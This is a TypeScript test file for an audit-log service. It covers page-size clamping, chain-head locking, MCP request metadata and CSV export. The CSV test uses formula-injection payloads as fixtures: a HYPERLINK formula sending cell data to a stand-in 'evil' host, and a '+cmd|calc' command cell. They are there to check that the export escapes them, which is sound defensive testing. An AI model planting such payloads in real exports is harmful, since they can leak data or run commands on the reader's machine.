// @vitest-environment node

/**
 * The audit-log read surface over a recording fake of the postgres.js tag:
 * the page size that reaches `LIMIT` (every door pages through
 * `listAuditLogs`, so the clamp lives there) and the CSV export's
 * neutralisation of spreadsheet-formula cells — the export's reader is the
 * org's most privileged one, and titles and e-mails are member-authored.
 */

import {
  RETRY_QUEUE_LOCK_CLASS,
  retryQueueKeyOf,
} from '@tale/shared/db/serializable';
import type { Sql, TransactionSql } from 'postgres';
import { describe, expect, it, vi } from 'vitest';

import { runInRequestChannel } from '../../lib/request-channel.ts';
import {
  auditChainQueueKey,
  buildAuditExport,
  createAuditLog,
  listAuditLogs,
} from './service.ts';
import type { AuditLogRow } from './types.ts';

interface Statement {
  text: string;
  values: unknown[];
}

function fakeSql(rows: unknown[] = []): { sql: Sql; statements: Statement[] } {
  const statements: Statement[] = [];
  const tag = (strings: TemplateStringsArray, ...values: unknown[]) => {
    let text = '';
    const flat: unknown[] = [];
    strings.forEach((part, index) => {
      text += part;
      if (index >= values.length) return;
      const value = values[index];
      if (
        typeof value === 'object' &&
        value !== null &&
        'unsafeText' in value
      ) {
        text += String(value.unsafeText);
      } else {
        text += '?';
        flat.push(value);
      }
    });
    text = text.replace(/\s+/g, ' ').trim();
    statements.push({ text, values: flat });
    return Promise.resolve(rows);
  };
  tag.unsafe = (text: string) => ({ unsafeText: text });
  return { sql: tag as unknown as Sql, statements };
}

/**
 * Recording fake of a transaction tag whose answer depends on the statement
 * — the chain-head lock returns a head, the audit INSERT an id, and a
 * responder may throw to stand in for a Postgres error.
 */
function fakeTx(respond: (statement: Statement) => unknown[]): {
  tx: TransactionSql;
  statements: Statement[];
} {
  const statements: Statement[] = [];
  const tag = (strings: TemplateStringsArray, ...values: unknown[]) => {
    const text = strings
      .reduce(
        (acc, part, index) =>
          `${acc}${part}${index < values.length ? '?' : ''}`,
        '',
      )
      .replace(/\s+/g, ' ')
      .trim();
    const statement = { text, values };
    statements.push(statement);
    try {
      return Promise.resolve(respond(statement));
    } catch (error) {
      return Promise.reject(error);
    }
  };
  tag.unsafe = (text: string) => ({ unsafeText: text });
  return { tx: tag as unknown as TransactionSql, statements };
}

function sqlstateError(code: string): Error {
  const error: Error & { code?: string } = new Error(`sqlstate ${code}`);
  error.code = code;
  return error;
}

function limitOf(statements: Statement[]): unknown {
  const query = statements.find((s) => s.text.includes('FROM app.audit_logs'));
  return query?.values.at(-1);
}

describe('listAuditLogs — page size [AUDIT-R4]', () => {
  it.each([
    [-5, 2],
    [0, 2],
    [2.7, 3],
    [50, 51],
    [10_000, 201],
  ])(
    'clamps limit %s to a LIMIT of %s (page + 1 lookahead)',
    async (limit, expected) => {
      const fake = fakeSql();
      await listAuditLogs(fake.sql, 'org_1', { limit });
      expect(limitOf(fake.statements)).toBe(expected);
    },
  );

  it('defaults to 50', async () => {
    const fake = fakeSql();
    await listAuditLogs(fake.sql, 'org_1');
    expect(limitOf(fake.statements)).toBe(51);
  });
});

describe('buildAuditExport — CSV', () => {
  const row = (overrides: Partial<AuditLogRow>): AuditLogRow => ({
    id: 'a1',
    organizationId: 'org_1',
    actorId: 'u1',
    actorEmail: null,
    actorEmailHash: null,
    actorRole: null,
    actorType: 'user',
    action: 'document.rename',
    category: 'data',
    resourceType: 'document',
    resourceId: 'd1',
    resourceName: null,
    previousState: null,
    newState: null,
    changedFields: null,
    sessionId: null,
    ipAddress: null,
    actorIpHash: null,
    userAgent: null,
    requestId: null,
    timestamp: 0,
    status: 'success',
    errorMessage: null,
    metadata: null,
    integrityHash: 'h',
    previousHash: null,
    piiScrubbed: null,
    ...overrides,
  });

  it('neutralises formula prefixes in member-authored cells [AUDIT-R6]', async () => {
    const fake = fakeSql([
      row({
        resourceName: '=HYPERLINK("http://evil/"&A1,"x")',
        actorEmail: '+cmd|calc',
        errorMessage: '-1+1',
      }),
      row({ id: 'a2', resourceName: '@SUM(A1)' }),
      row({ id: 'a3', resourceName: '\tsneaky' }),
      row({ id: 'a4', resourceName: 'Quarterly report, final' }),
    ]);

    const built = await buildAuditExport(fake.sql, 'org_1', { format: 'csv' });
    const lines = built.content.split('\n');

    expect(lines[1]).toContain(`"'=HYPERLINK(""http://evil/""&A1,""x"")"`);
    expect(lines[1]).toContain(`'+cmd|calc`);
    expect(lines[1]).toContain(`'-1+1`);
    expect(lines[2]).toContain(`'@SUM(A1)`);
    expect(lines[3]).toContain(`'\tsneaky`);
    // Ordinary text is untouched — quoted only for the comma.
    expect(lines[4]).toContain('"Quarterly report, final"');
    expect(lines[4]).not.toContain("'Quarterly");
  });
});

describe('createAuditLog — chain-head lock', () => {
  const args = {
    organizationId: 'org_1',
    actorId: 'u1',
    actorType: 'user' as const,
    action: 'document.rename',
    category: 'data' as const,
    resourceType: 'document',
    resourceId: 'd1',
    status: 'success' as const,
  };
  const headResponder =
    (atHeadLock: () => unknown[]) =>
    (statement: Statement): unknown[] => {
      if (statement.text.includes('FOR UPDATE')) {
        return atHeadLock();
      }
      if (statement.text.includes('INSERT INTO app.audit_logs')) {
        return [{ id: 'a1' }];
      }
      return [];
    };

  it("takes the org's queue lock before it touches the head row", async () => {
    const fake = fakeTx(headResponder(() => [{ lastHash: '', lastTs: 0 }]));
    await expect(createAuditLog(fake.tx, args)).resolves.toBe('a1');
    expect(fake.statements[0]).toEqual({
      text: 'SELECT pg_advisory_xact_lock(?, hashtext(?))',
      values: [RETRY_QUEUE_LOCK_CLASS, auditChainQueueKey('org_1')],
    });
    expect(fake.statements[1]?.text).toContain(
      'INSERT INTO app.audit_chain_heads',
    );
    expect(fake.statements[2]?.text).toContain('FOR UPDATE');
  });

  it("marks a serialization failure at the head with the org's queue key", async () => {
    const fake = fakeTx(
      headResponder(() => {
        throw sqlstateError('40001');
      }),
    );
    const failure = await createAuditLog(fake.tx, args).catch(
      (error: unknown) => error,
    );
    expect(retryQueueKeyOf(failure)).toBe(auditChainQueueKey('org_1'));
    expect(fake.statements.some((s) => s.text.includes('audit_logs'))).toBe(
      false,
    );
  });

  it('leaves other failures unmarked', async () => {
    const fake = fakeTx(
      headResponder(() => {
        throw sqlstateError('23505');
      }),
    );
    const failure = await createAuditLog(fake.tx, args).catch(
      (error: unknown) => error,
    );
    expect(failure).toBeInstanceOf(Error);
    expect(retryQueueKeyOf(failure)).toBeUndefined();
  });
});

/**
 * A write a coding agent caused deep inside a domain says so: the MCP door
 * runs each tool call in a request channel, and every audit row written
 * during it carries the door, the tool, the key and the client — stamped
 * before the row is hashed, so the stored row verifies.
 */
describe('createAuditLog — the request channel', () => {
  const args = {
    organizationId: 'org_1',
    actorId: 'u1',
    actorType: 'user' as const,
    action: 'automation.run.cancelled',
    category: 'workflow' as const,
    resourceType: 'automation_run',
    resourceId: 'run_1',
    status: 'success' as const,
  };
  const channel = {
    via: 'mcp' as const,
    requestId: 'req-mcp-1',
    tool: 'cancel_run',
    apiKeyId: 'key_1',
    clientName: 'Claude Code',
  };

  /** The INSERT's metadata, request id and integrity hash. */
  async function insertOf(
    run: (tx: TransactionSql) => Promise<string>,
  ): Promise<{ metadata: unknown; requestId: unknown; hash: unknown }> {
    const fake = fakeTx((statement) => {
      if (statement.text.includes('FOR UPDATE')) {
        return [{ lastHash: 'h0', lastTs: 0 }];
      }
      if (statement.text.includes('INSERT INTO app.audit_logs')) {
        return [{ id: 'a1' }];
      }
      return [];
    });
    Object.assign(fake.tx, { json: (value: unknown) => ({ json: value }) });
    await run(fake.tx);
    const insert = fake.statements.find((s) =>
      s.text.includes('INSERT INTO app.audit_logs'),
    );
    const values = insert?.values ?? [];
    const metadata = values[22];
    return {
      metadata:
        metadata !== null && typeof metadata === 'object' && 'json' in metadata
          ? metadata.json
          : metadata,
      requestId: values[18],
      hash: values[23],
    };
  }

  it('stamps the door, tool, key and client of an MCP call on every row written inside it', async () => {
    const written = await insertOf((tx) =>
      runInRequestChannel(channel, () => createAuditLog(tx, args)),
    );
    expect(written.metadata).toEqual({
      via: 'mcp',
      tool: 'cancel_run',
      apiKeyId: 'key_1',
      clientName: 'Claude Code',
    });
    expect(written.requestId).toBe('req-mcp-1');
  });

  it('keeps what the writer said: its own metadata, its own via and its own request id', async () => {
    const merged = await insertOf((tx) =>
      runInRequestChannel(channel, () =>
        createAuditLog(tx, { ...args, metadata: { runId: 'run_1' } }),
      ),
    );
    expect(merged.metadata).toEqual({
      via: 'mcp',
      tool: 'cancel_run',
      apiKeyId: 'key_1',
      clientName: 'Claude Code',
      runId: 'run_1',
    });
    const own = await insertOf((tx) =>
      runInRequestChannel(channel, () =>
        createAuditLog(tx, {
          ...args,
          requestId: 'req-own',
          metadata: { via: 'upload' },
        }),
      ),
    );
    expect(own.metadata).toEqual({ via: 'upload' });
    expect(own.requestId).toBe('req-own');
  });

  it('hashes the stamped row, so it verifies like a row the writer stamped itself', async () => {
    vi.useFakeTimers();
    try {
      vi.setSystemTime(1_760_000_000_000);
      const inChannel = await insertOf((tx) =>
        runInRequestChannel(channel, () => createAuditLog(tx, args)),
      );
      const explicit = await insertOf((tx) =>
        createAuditLog(tx, {
          ...args,
          requestId: 'req-mcp-1',
          metadata: {
            via: 'mcp',
            tool: 'cancel_run',
            apiKeyId: 'key_1',
            clientName: 'Claude Code',
          },
        }),
      );
      expect(typeof inChannel.hash).toBe('string');
      expect(inChannel.hash).toBe(explicit.hash);
    } finally {
      vi.useRealTimers();
    }
  });

  it('adds nothing outside a channel', async () => {
    const written = await insertOf((tx) => createAuditLog(tx, args));
    expect(written.metadata).toBeNull();
    expect(written.requestId).toBeNull();
  });
});
